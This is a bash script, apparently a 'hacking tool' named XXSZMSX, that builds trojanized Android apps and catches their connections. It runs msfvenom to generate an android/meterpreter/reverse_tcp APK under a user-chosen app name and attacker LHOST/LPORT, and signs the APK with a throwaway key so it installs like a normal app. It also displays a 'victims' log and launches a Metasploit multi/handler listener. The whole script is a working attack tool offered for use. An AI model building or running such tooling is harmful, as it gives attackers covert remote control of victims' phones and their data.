cat << 'EOF' > xxszmsx.sh
#!/bin/bash
# =====================================================
# TOOL: XXSZMSX (BLOOD APK FIX)
# STYLE: RED HORROR / WORKING PAYLOADS
# =====================================================

BRED='\e[1;31;1m'
RED='\e[1;31m'
NC='\e[0m'

# مسار الحفظ التلقائي
[[ -d "/data/data/com.termux/files/usr/bin" ]] && SAVE_DIR="/sdcard" || SAVE_DIR="$HOME/Desktop"

# تجهيز الأدوات اللازمة للتوقيع (لو مش عندك)
if ! command -v jarsigner &> /dev/null; then
    echo -e "${RED}[!] Installing Sign Tools...${NC}"
    pkg install openjdk-17 -y &> /dev/null
fi

# --- [ واجهة الدخول ] ---
clear
echo -e "${BRED}┌────────────────────────────────────────┐"
echo -e "│       XXSZMSX : BLOOD ACCESS           │"
echo -e "└────────────────────────────────────────┘${NC}"
echo -ne "${RED}[†] Identity: ${NC}"; read username
echo -ne "${RED}[†] Key: ${NC}"; read -s password

if [[ "$username" != "user" || "$password" != "123456789" ]]; then
    echo -e "${BRED}[!] ALERT: ACCESS DENIED!${NC}"; exit 1
fi

# --- [ القائمة الرئيسية ] ---
while true; do
    clear
    echo -e "${BRED}"
    echo "  ██╗  ██╗██╗  ██╗ ██████╗ ███████╗"
    echo "  ╚██╗██╔╝╚██╗██╔╝██╔════╝ ╚══███╔╝"
    echo "   ╚███╔╝  ╚███╔╝ ███████╗   ███╔╝ "
    echo "   ██╔██╗  ██╔██╗ ╚════██╗  ███╔╝  "
    echo "  ██╔╝ ██╗██╔╝ ██╗███████║ ███████╗"
    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚══════╝"
    echo "   ███╗   ███╗ ███████╗ ██╗  ██╗   "
    echo "   ████╗ ████║ ██╔════╝ ╚██╗██╔╝   "
    echo "   ██╔████╔██║ ███████╗  ╚███╔╝    "
    echo "   ██║╚██╔╝██║ ╚════██║  ██╔██╗    "
    echo "   ██║ ╚═╝ ██║ ███████║ ██╔╝ ██╗   "
    echo "   ╚═╝     ╚═╝ ╚══════╝ ╚═╝  ╚═╝   "
    echo "      [ X X S Z M S X  V70.0 ]"
    echo "  ------------------------------------"
    echo -e "  [ SYSTEM: WORKING APK MODE ]"
    echo -e "  ------------------------------------${NC}"
    
    echo -e "${RED}  [1]${NC} Build Working APK (Signed)"
    echo -e "${RED}  [2]${NC} Victims Blood-Logs"
    echo -e "${RED}  [3]  Start Listener"
    echo -e "${RED}  [0]  Shutdown System"
    echo -ne "${BRED}  XXSZMSX >> ${NC}"
    read choice

    case $choice in
        1) 
           clear
           echo -e "${BRED}--- [ GENERATING REAL APK ] ---${NC}"
           read -p "[+] App Name: " app_name
           read -p "[+] LHOST IP: " lh
           read -p "[+] LPORT: " lp
           
           echo -e "${RED}[*] Building Payload...${NC}"
           msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp -o temp.apk &> /dev/null
           
           echo -e "${RED}[*] Signing APK (Making it Real)...${NC}"
           # توليد مفتاح توقيع وهمي لتشغيل الملف
           keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000 -storepass 123456 -keypass 123456 -dname "CN=XXSZMSX, OU=Hacking, O=Blood, L=Kuwait, S=AlAhmadi, C=KW" &> /dev/null
           
           jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore -storepass 123456 temp.apk alias_name &> /dev/null
           
           mv temp.apk "$SAVE_DIR/$app_name.apk"
           rm my-release-key.keystore
           
           echo -e "${BRED}[+] SUCCESS! APK IS READY & SIGNED."
           echo -e "[+] Saved to: $SAVE_DIR/$app_name.apk${NC}"
           read -p "Press Enter to return..." ;;
        2)
           clear
           echo -e "${BRED}--- [ VICTIMS LOG ] ---${NC}"
           [ -f ".victims_log.txt" ] && cat ".victims_log.txt" || echo -e "${RED}Empty.${NC}"
           read -p "Press Enter to return..." ;;
        3) 
           clear
           echo -e "${RED}[*] Opening Tunnel...${NC}"
           msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; exploit -j" ;;
        0) exit 0 ;;
    esac
done
EOF
